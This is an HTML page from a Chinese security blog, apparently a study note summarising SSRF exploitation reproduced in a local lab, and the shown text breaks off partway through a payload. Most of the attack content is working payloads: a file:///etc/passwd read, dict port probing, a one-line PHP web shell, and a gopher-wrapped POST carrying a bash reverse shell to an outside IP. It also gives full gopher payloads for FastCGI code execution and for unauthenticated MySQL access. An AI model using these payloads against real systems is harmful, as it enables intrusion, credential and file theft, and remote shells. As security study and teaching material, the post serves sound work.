@@ -1,0 +1,1430 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言因为过去学习中没有较全面的整理SSRF笔记，现重新学习并总结；由于SSRF网络教程已经很多，所以本篇大部分内容将参考网络教程，选择一部分在本地进行复现测试">
+<meta name="keywords" content="web安全,SSRF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF漏洞总结">
+<meta property="og:url" content="https://songxpu.github.io/2019/09/04/SSRF漏洞总结/index.html">
+<meta property="og:site_name" content="Pines404">
+<meta property="og:description" content="前言因为过去学习中没有较全面的整理SSRF笔记，现重新学习并总结；由于SSRF网络教程已经很多，所以本篇大部分内容将参考网络教程，选择一部分在本地进行复现测试">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/04/SSRF漏洞总结/1.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/04/SSRF漏洞总结/2.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/04/SSRF漏洞总结/3.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/04/SSRF漏洞总结/4.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/04/SSRF漏洞总结/5.jpg">
+<meta property="og:updated_time" content="2019-09-04T10:37:21.948Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SSRF漏洞总结">
+<meta name="twitter:description" content="前言因为过去学习中没有较全面的整理SSRF笔记，现重新学习并总结；由于SSRF网络教程已经很多，所以本篇大部分内容将参考网络教程，选择一部分在本地进行复现测试">
+<meta name="twitter:image" content="https://songxpu.github.io/2019/09/04/SSRF漏洞总结/1.jpg">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://songxpu.github.io/2019/09/04/SSRF漏洞总结/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>SSRF漏洞总结 | Pines404</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pines404</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">穷究于理，成就于工</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签<span class="badge">10</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类<span class="badge">2</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">10</span></a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://songxpu.github.io/2019/09/04/SSRF漏洞总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Azeroth">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pines404">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SSRF漏洞总结
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-09-04 18:35:48 / 修改时间：18:37:21" itemprop="dateCreated datePublished" datetime="2019-09-04T18:35:48+08:00">2019-09-04</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">6.5k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">6 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为过去学习中没有较全面的整理SSRF笔记，现重新学习并总结；由于SSRF网络教程已经很多，所以本篇大部分内容将参考网络教程，选择一部分在本地进行复现测试</p>
+<a id="more"></a>
+
+<h2 id="关于SSRF"><a href="#关于SSRF" class="headerlink" title="关于SSRF"></a>关于SSRF</h2><p>服务端请求伪造，用户通过WEB访问/上传/发出请求，绕过服务器防火墙，获取服务器及其内网信息。SSRF可以说是一个媒介，结合服务器中的服务，常常可以形成一条完整的攻击链。</p>
+<h2 id="产生条件"><a href="#产生条件" class="headerlink" title="产生条件"></a>产生条件</h2><p>由于服务端提供了从其他服务器应用获取数据的功能且没有对用户可控的目标地址做过虑与限制。</p>
+<p>在PHP中的curl()，file_get_contents()，fsockopen()等函数。</p>
+<p>注：file_get_contents 情况使用 gopher 协议不能 URLencode</p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><blockquote>
+<p>演示环境为ssrf-lab，后端用curl实现</p>
+</blockquote>
+<h3 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h3><ol>
+<li>可以对外网服务器所在内网/本地进行端口扫描，获取一些服务的banner信息。</li>
+<li>攻击内网web应用（通过get传参就可以实现的攻击，如：st2,sqli等）。</li>
+<li>利用file协议读取本地文件。</li>
+<li>攻击fastcgi 反弹shell。</li>
+<li>攻击redis、mysql等。</li>
+<li>攻击运行在内网或本地的应用程序（比如溢出）</li>
+</ol>
+<h3 id="file协议读取本地文件"><a href="#file协议读取本地文件" class="headerlink" title="file协议读取本地文件"></a>file协议读取本地文件</h3><p><strong>file:///etc/passwd</strong></p>
+<img src="//songxpu.github.io/2019/09/04/SSRF漏洞总结/1.jpg">
+
+<h3 id="dict协议探测端口"><a href="#dict协议探测端口" class="headerlink" title="dict协议探测端口"></a>dict协议探测端口</h3><p>有回显表示端口开放，无回显即端口关闭</p>
+<p><strong>dict://127.0.0.1:80</strong></p>
+<img src="//songxpu.github.io/2019/09/04/SSRF漏洞总结/2.jpg">
+
+<h3 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h3><blockquote>
+<p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。<br>Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p>
+<p>Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。</p>
+</blockquote>
+<h4 id="攻击内网主机"><a href="#攻击内网主机" class="headerlink" title="攻击内网主机"></a>攻击内网主机</h4><p>假设有一台主机存在exp.php文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//exp.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> system($_POST[e]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用方式：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/exp.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: curl/7.43.0</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Content-Length</span>: 49</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">e=bash -i &gt;%26 /dev/tcp/172.19.23.228/2333 0&gt;%261</span><br></pre></td></tr></table></figure>
+
+<p>构造gopher协议的url：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">80</span>/_POST /exp.php HTTP/<span class="number">1.1</span><span class="symbol">%0</span>d<span class="symbol">%0</span>aHost: <span class="number">127.0</span>.<span class="number">0.1</span><span class="symbol">%0</span>d<span class="symbol">%0</span>aUser-Agent: curl/<span class="number">7.43</span>.<span class="number">0</span><span class="symbol">%0</span>d<span class="symbol">%0</span>aAccept: */*<span class="symbol">%0</span>d<span class="symbol">%0</span>aContent-Length: <span class="number">49</span><span class="symbol">%0</span>d<span class="symbol">%0</span>aContent-Type: application/<span class="keyword">x</span>-www-form-urlencoded<span class="symbol">%0</span>d<span class="symbol">%0</span>a<span class="symbol">%0</span>d<span class="symbol">%0</span>ae=bash -i &gt;<span class="symbol">%2526</span> /dev/tcp/<span class="number">172.19</span>.<span class="number">23.228</span>/<span class="number">2333</span> <span class="number">0</span>&gt;<span class="symbol">%25261</span><span class="keyword">null</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>湖湘杯2018</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"ssrf me with parameter 'url'"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </span><br><span class="line"><span class="comment">//echo $_GET['url'];</span></span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line"><span class="keyword">echo</span> curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line"></span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'user'</span>]))&#123;</span><br><span class="line">  <span class="keyword">if</span>($_POST[<span class="string">'user'</span>]==<span class="string">"admin"</span> &amp;&amp; $ip==<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">    system(<span class="string">"/var/www/html/ssrf/readflag"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="gopher攻击内网redis"><a href="#gopher攻击内网redis" class="headerlink" title="gopher攻击内网redis"></a>gopher攻击内网redis</h4><p>见上一篇文章：<a href="http://pines404.online/2019/09/02/Redis漏洞利用与SSRF/" target="_blank" rel="noopener">Redis漏洞利用与SSRF</a></p>
+<h4 id="gopher攻击FastCGI"><a href="#gopher攻击FastCGI" class="headerlink" title="gopher攻击FastCGI"></a>gopher攻击FastCGI</h4><p>参考<a href="https://www.jianshu.com/p/fd27f0eedccf" target="_blank" rel="noopener">https://www.jianshu.com/p/fd27f0eedccf</a></p>
+<p>利用条件</p>
+<ul>
+<li>libcurl版本&gt;=7.45.0(由于EXP里有%00，CURL版本小于7.45.0的版本，gopher的%00会被截断)</li>
+<li>PHP-FPM监听端口</li>
+<li>PHP-FPM版本 &gt;= 5.3.3</li>
+<li>知道服务器上任意一个php文件的绝对路径</li>
+</ul>
+<p>转换为Gopher的EXP<br>监听一个端口的流量 <code>nc -lvvp 2333 &gt; 1.txt</code>，执行EXP，流量打到2333端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fpm.py -c "&lt;?php system('echo sectest &gt; /tmp/1.php'); exit;?&gt;" -p 2333 127.0.0.1 php文件绝对路径</span><br></pre></td></tr></table></figure>
+
+<p>fpm.py地址<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a><br>url编码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">'1.txt'</span>)</span><br><span class="line">ff = f.read()</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">print</span> quote(ff)</span><br></pre></td></tr></table></figure>
+
+<p>得到gopher的exp</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">curl</span> 'gopher://127.0.0.1:9000/_<span class="number">%01</span><span class="number">%01</span><span class="number">%97</span><span class="number">%9</span>C<span class="number">%00</span><span class="number">%08</span><span class="number">%00</span><span class="number">%00</span><span class="number">%00</span><span class="number">%01</span><span class="number">%00</span><span class="number">%00</span><span class="number">%00</span><span class="number">%00</span><span class="number">%00</span><span class="number">%00</span><span class="number">%01</span><span class="number">%04</span><span class="number">%97</span><span class="number">%9</span>C<span class="number">%01</span>%D5<span class="number">%00</span><span class="number">%00</span><span class="number">%0</span>E<span class="number">%02</span>CONTENT_LENGTH50<span class="number">%0</span>C<span class="number">%10</span>CONTENT_TYPEapplication/text<span class="number">%0</span>B<span class="number">%04</span>REMOTE_PORT9985<span class="number">%0</span>B<span class="number">%09</span>SERVER_NAMElocalhost<span class="number">%11</span><span class="number">%0</span>BGATEWAY_INTERFACEFastCGI/1.0<span class="number">%0</span>F<span class="number">%0</span>ESERVER_SOFTWAREphp/fcgiclient<span class="number">%0</span>B<span class="number">%09</span>REMOTE_ADDR127.0.0.1<span class="number">%0</span>F<span class="number">%15</span>SCRIPT_FILENAME/var/www/html/123.php<span class="number">%0</span>B<span class="number">%15</span>SCRIPT_NAME/var/www/html/123.php<span class="number">%09</span><span class="number">%1</span>FPHP_VALUEauto_prepend_file<span class="number">%20</span><span class="number">%3</span>D<span class="number">%20</span>php<span class="number">%3</span>A//input<span class="number">%0</span>E<span class="number">%04</span>REQUEST_METHODPOST<span class="number">%0</span>B<span class="number">%02</span>SERVER_PORT80<span class="number">%0</span>F<span class="number">%08</span>SERVER_PROTOCOLHTTP/1.1<span class="number">%0</span>C<span class="number">%00</span>QUERY_STRING<span class="number">%0</span>F<span class="number">%16</span>PHP_ADMIN_VALUEallow_url_include<span class="number">%20</span><span class="number">%3</span>D<span class="number">%20</span><span class="literal">On</span><span class="number">%0</span>D<span class="number">%01</span>DOCUMENT_ROOT/<span class="number">%0</span>B<span class="number">%09</span>SERVER_ADDR127.0.0.1<span class="number">%0</span>B<span class="number">%15</span>REQUEST_URI/var/www/html/123.php<span class="number">%01</span><span class="number">%04</span><span class="number">%97</span><span class="number">%9</span>C<span class="number">%00</span><span class="number">%00</span><span class="number">%00</span><span class="number">%00</span><span class="number">%01</span><span class="number">%05</span><span class="number">%97</span><span class="number">%9</span>C<span class="number">%002</span><span class="number">%00</span><span class="number">%00</span><span class="number">%3</span>C<span class="number">%3</span>Fphp<span class="number">%20</span>system<span class="number">%28</span><span class="number">%27</span>echo<span class="number">%20</span>sectest<span class="number">%20</span><span class="number">%3</span>E<span class="number">%20</span>/tmp/1.php<span class="number">%27</span><span class="number">%29</span><span class="number">%3</span>B<span class="number">%20</span>exit<span class="number">%3</span>B<span class="number">%3</span>F<span class="number">%3</span>E<span class="number">%01</span><span class="number">%05</span><span class="number">%97</span><span class="number">%9</span>C<span class="number">%00</span><span class="number">%00</span><span class="number">%00</span><span class="number">%00</span>'</span><br></pre></td></tr></table></figure>
+
+<h4 id="gopher攻击内网mysql"><a href="#gopher攻击内网mysql" class="headerlink" title="gopher攻击内网mysql"></a>gopher攻击内网mysql</h4><blockquote>
+<p>MySQL有密码和无密码的认证方式不一样，无密码认证时直接发送TCP/IP数据包即可访问，有密码数据包中存在加盐加密。如果内网中的mysql数据库存在无密码的用户，可结合gopher协议进行攻击。</p>
+</blockquote>
+<p>首先配置数据库，kali默认安装的为MariaDB，配置路径与mysql不同；</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进入mysql命令行，设置无密码：</span></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">PASSWORD</span> <span class="keyword">FOR</span> root@localhost=<span class="keyword">PASSWORD</span>(<span class="string">''</span>);</span><br><span class="line"><span class="comment">#修改配置文件：</span></span><br><span class="line">vim /etc/mysql/mariadb.conf.d/50-server.cnf，添加skip-<span class="keyword">grant</span>-<span class="keyword">tables</span></span><br></pre></td></tr></table></figure>
+
+<p>在kali下打开wireshark，监听<code>any</code>网卡</p>
+<p>执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -h127.0.0.1 -uroot -p#必须指定-h，否则流量不走网卡，无法抓取</span><br><span class="line">select flag from ssrf.flag;</span><br><span class="line">exit;</span><br></pre></td></tr></table></figure>
+
+<p>筛选出mysql数据包</p>
+<img src="//songxpu.github.io/2019/09/04/SSRF漏洞总结/3.jpg" width="650">
+
+<p>跟踪TCP流，选取request请求，并显示为原始数据</p>
+<img src="//songxpu.github.io/2019/09/04/SSRF漏洞总结/4.jpg" width="650">
+
+<p>编码为gopher协议格式</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span><span class="params">(s)</span>:</span></span><br><span class="line">    a=[s[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(s),<span class="number">2</span>)]<span class="comment">#两两一组</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"curl gopher://127.0.0.1:3306/_%"</span> + <span class="string">"%"</span>.join(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    s=sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">print</span> result(s)</span><br></pre></td></tr></table></figure>
+
+<p>得到payload</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">3306</span>/_<span class="symbol">%ae</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%01</span><span class="symbol">%85</span><span class="symbol">%a6</span><span class="symbol">%3</span>f<span class="symbol">%20</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%01</span><span class="symbol">%2</span>d<span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%72</span><span class="symbol">%6</span>f<span class="symbol">%6</span>f<span class="symbol">%74</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%6</span>d<span class="symbol">%79</span><span class="symbol">%73</span><span class="symbol">%71</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%5</span>f<span class="symbol">%6</span>e<span class="symbol">%61</span><span class="symbol">%74</span><span class="symbol">%69</span><span class="symbol">%76</span><span class="symbol">%65</span><span class="symbol">%5</span>f<span class="symbol">%70</span><span class="symbol">%61</span><span class="symbol">%73</span><span class="symbol">%73</span><span class="symbol">%77</span><span class="symbol">%6</span>f<span class="symbol">%72</span><span class="symbol">%64</span><span class="symbol">%00</span><span class="symbol">%71</span><span class="symbol">%03</span><span class="symbol">%5</span>f<span class="symbol">%6</span>f<span class="symbol">%73</span><span class="symbol">%10</span><span class="symbol">%64</span><span class="symbol">%65</span><span class="symbol">%62</span><span class="symbol">%69</span><span class="symbol">%61</span><span class="symbol">%6</span>e<span class="symbol">%2</span>d<span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%69</span><span class="symbol">%6</span>e<span class="symbol">%75</span><span class="symbol">%78</span><span class="symbol">%2</span>d<span class="symbol">%67</span><span class="symbol">%6</span>e<span class="symbol">%75</span><span class="symbol">%0</span><span class="keyword">c</span><span class="symbol">%5</span>f<span class="symbol">%63</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%69</span><span class="symbol">%65</span><span class="symbol">%6</span>e<span class="symbol">%74</span><span class="symbol">%5</span>f<span class="symbol">%6</span>e<span class="symbol">%61</span><span class="symbol">%6</span>d<span class="symbol">%65</span><span class="symbol">%08</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%69</span><span class="symbol">%62</span><span class="symbol">%6</span>d<span class="symbol">%79</span><span class="symbol">%73</span><span class="symbol">%71</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%04</span><span class="symbol">%5</span>f<span class="symbol">%70</span><span class="symbol">%69</span><span class="symbol">%64</span><span class="symbol">%04</span><span class="symbol">%31</span><span class="symbol">%30</span><span class="symbol">%33</span><span class="symbol">%38</span><span class="symbol">%0</span>f<span class="symbol">%5</span>f<span class="symbol">%63</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%69</span><span class="symbol">%65</span><span class="symbol">%6</span>e<span class="symbol">%74</span><span class="symbol">%5</span>f<span class="symbol">%76</span><span class="symbol">%65</span><span class="symbol">%72</span><span class="symbol">%73</span><span class="symbol">%69</span><span class="symbol">%6</span>f<span class="symbol">%6</span>e<span class="symbol">%07</span><span class="symbol">%31</span><span class="symbol">%30</span><span class="symbol">%2</span>e<span class="symbol">%31</span><span class="symbol">%2</span>e<span class="symbol">%32</span><span class="symbol">%36</span><span class="symbol">%09</span><span class="symbol">%5</span>f<span class="symbol">%70</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%61</span><span class="symbol">%74</span><span class="symbol">%66</span><span class="symbol">%6</span>f<span class="symbol">%72</span><span class="symbol">%6</span>d<span class="symbol">%06</span><span class="symbol">%78</span><span 